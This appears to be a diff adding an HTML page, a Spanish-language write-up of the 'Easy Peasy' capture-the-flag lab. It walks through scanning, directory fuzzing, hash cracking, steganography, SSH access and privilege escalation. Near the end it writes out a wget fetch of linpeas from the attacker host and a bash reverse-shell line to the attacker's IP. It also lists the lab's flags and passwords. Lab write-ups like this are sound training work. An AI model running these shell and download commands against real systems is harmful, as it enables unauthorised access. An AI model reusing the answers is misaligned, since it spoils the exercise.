@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Easy Peasy</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #0047ab;
+        }
+
+        h2 {
+            color: #0081ab;
+        }
+
+        code {
+            background-color: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+    </style>
+</head>
+<body>
+    <div style="margin-left: 20%; margin-right: 20%;">
+        <h1># Easy Peasy</h1>
+
+        <h2>Nmap</h2>
+        <img src="image.png" alt="alt text">
+
+        <h2>Puertos abiertos</h2>
+        <img src="image-10.png" alt="alt text">
+
+        <h2>Web</h2>
+        <p>Puerto 80</p>
+        <img src="image-1.png" alt="alt text">
+        <p>Robots.txt</p>
+        <img src="image-2.png" alt="alt text">
+        <p>Versión nginx</p>
+        <img src="image-3.png" alt="alt text">
+        <p>Puerto 65524</p>
+        <img src="image-11.png" alt="alt text">
+
+        <h2>Fuzzing</h2>
+        <pre><code>gobuster dir -u http://10.10.44.195/ -w Desktop/common.txt -x php</code></pre>
+        <img src="image-4.png" alt="alt text">
+        <img src="image-5.png" alt="alt text">
+        <img src="image-6.png" alt="alt text">
+        <img src="image-7.png" alt="alt text">
+        <img src="image-8.png" alt="alt text">
+        <img src="image-9.png" alt="alt text">
+        <pre><code>flag{f1rs7_fl4g}</code></pre>
+        <img src="image-12.png" alt="alt text">
+        <img src="image-13.png" alt="alt text">
+        <p>Para crackear el hash lo introducimos en la siguiente web <a href="https://md5hashing.net/hash/md5">md5hashing</a></p>
+        <pre><code>flag{1m_s3c0nd_fl4g}</code></pre>
+        <img src="image-14.png" alt="alt text">
+        <p>Encontramos la tercera flag en la misma web de apache</p>
+        <img src="image-15.png" alt="alt text">
+        <p>Encontramos un codigo cifrado en base62, hace referencia a la ruta escondida "/n0th1ng3ls3m4tt3r"</p>
+        <img src="image-16.png" alt="alt text">
+        <img src="image-17.png" alt="alt text">
+        <p>En el código fuente encontramos un hash</p>
+        <img src="image-18.png" alt="alt text">
+        <p>Usamos "hash-identifier", para ver posibles cifrados</p>
+        <img src="image-19.png" alt="alt text">
+        <p>Use los posibles cifrados pero no lo encontré, por lo que use john y el diccionario de contraseñas "easypeasy.txt"</p>
+        <img src="image-20.png" alt="alt text">
+        <img src="image-21.png" alt="alt text">
+        <pre><code>mypasswordforthatjob</code></pre>
+        <p>Descargamos la imagen de la web, comprobamos si tiene algun texto escondido</p>
+        <pre><code>steghide extract -sf binarycodepixabay.jpg</code></pre>
+        <p>Nos pide una contraseña, usamos la que acabamos de conseguir</p>
+        <img src="image-22.png" alt="alt text">
+        <img src="image-23.png" alt="alt text">
+        <pre><code>iconvertedmypasswordtobinary</code></pre>
+        <h2>SSH</h2>
+        <pre><code>ssh -p 6498 boring@10.10.254.187</code></pre>
+        <img src="image-24.png" alt="alt text">
+        <p>Encontramos un ``user.txt`` con la flag ¿rotada?</p>
+        <img src="image-26.png" alt="alt text">
+        <p>Usamos rot13</p>
+        <pre><code>flag{n0wits33msn0rm4l}</code></pre>
+        <img src="image-25.png" alt="alt text">
+        <h2>Escalada de privilegios</h2>
+        <p>Iniciamos un servidor para subir ``linpeas``</p>
+        <pre><code>python3 -m http.server 1234</code></pre>
+        <img src="image-27.png" alt="alt text">
+        <p>Lo descargamos en la máquina atacada</p>
+        <pre><code>wget 10.8.67.209:1234/linpeas.sh</code></pre>
+        <img src="image-28.png" alt="alt text">
+        <p>Lo ejecutamos</p>
+        <pre><code>chmod +x linpeas.sh
+./linpeas.sh</code></pre>
+        <img src="image-29.png" alt="alt text">
+        <p>Creamos una shell en el archivo</p>
+        <pre><code>bash -i >& /dev/tcp/10.8.67.209/8080 0>&1</code></pre>
+        <img src="image-30.png" alt="alt text">
+        <p>Ponemos el puerto en escucha, ya tendremos acceso ``root``</p>
+        <img src="image-31.png" alt="alt text">
+        <p>Buscamos ``root.txt``</p>
+        <img src="image-32.png" alt="alt text">
+
+
+
+
+
+
+
+
+
+
+
